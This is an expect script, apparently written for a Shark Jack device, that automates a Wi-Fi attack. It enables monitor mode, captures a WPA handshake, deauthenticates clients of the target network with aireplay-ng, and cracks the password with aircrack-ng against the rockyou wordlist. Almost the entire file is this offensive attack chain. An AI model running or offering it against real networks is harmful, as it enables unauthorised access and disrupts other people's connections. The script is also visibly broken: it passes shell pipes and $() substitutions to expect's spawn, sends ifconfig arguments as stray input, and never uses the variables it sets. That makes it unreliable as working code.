#!/usr/bin/expect

# Set up the Shark Jack as a network device
spawn ifconfig eth0 up
send "192.168.1.2 netmask 255.255.255.0\n"
send "route add default gw 192.168.1.1\n"
send "echo 1 > /proc/sys/net/ipv4/ip_forward\n"
expect "# "

# Set up the wireless interface and scan for nearby networks
spawn airmon-ng start wlan0
expect "# "

spawn iwlist wlan0 scanning | grep 'ESSID\|Address\|Channel'
expect eof

# Select the target network and channel automatically
set ESSID "target_network_name"
set CHANNEL "target_network_channel"

# Capture the network traffic and crack the password
spawn airodump-ng --bssid $(iw dev wlan0 link | grep -oE 'SSID: .*' | cut -f 2- -d ' ' | xargs -I % sudo iw dev wlan0 info | grep -B 1 % | grep -oE 'BSS [a-zA-Z0-9:]*' | cut -f 2- -d ' ') -c $CHANNEL -w /root/loot/captured_handshake wlan0mon &
expect "# "

sleep 10
spawn aireplay-ng -0 1 -a $(iw dev wlan0 link | grep -oE 'SSID: .*' | cut -f 2- -d ' ' | xargs -I % sudo iw dev wlan0 info | grep -B 1 % | grep -oE 'BSS [a-zA-Z0-9:]*' | cut -f 2- -d ' ') wlan0mon &
expect "# "

wait
spawn aircrack-ng /root/loot/captured_handshake*.cap -w /usr/share/wordlists/rockyou.txt
expect eof
